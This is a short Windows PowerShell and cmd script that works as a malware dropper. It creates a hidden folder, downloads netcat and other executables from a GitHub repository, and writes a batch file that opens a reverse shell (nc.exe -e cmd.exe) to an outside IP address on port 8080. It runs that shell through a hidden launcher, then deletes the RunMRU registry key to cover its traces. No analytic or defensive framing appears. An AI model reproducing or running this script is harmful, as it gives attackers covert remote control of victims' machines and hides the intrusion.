cmd /c "md C:\nc"
cmd /c "attrib +h C:\nc"
(new-object System.Net.WebClient).Downloadfile("https://raw.githubusercontent.com/7ext34/7ext-34/master/nc.bat","C:\nc\nc.bat")
(new-object System.Net.WebClient).Downloadfile("https://raw.githubusercontent.com/7ext34/7ext-34/master/nc.exe","C:\nc\nc.exe")
(new-object System.Net.WebClient).Downloadfile("https://raw.githubusercontent.com/7ext34/7ext-34/master/rh.exe","C:\nc\rh.exe")
(new-object System.Net.WebClient).Downloadfile("https://raw.githubusercontent.com/7ext34/7ext-34/master/voice.exe","C:\nc\voice.exe")
echo "nc.exe 64.52.163.41 8080 -e cmd.exe" >> C:\nc\nc_run.bat
Start-Process -FilePath C:\nc\rh.exe C:\nc\nc.bat
cmd /c "reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va  /f"
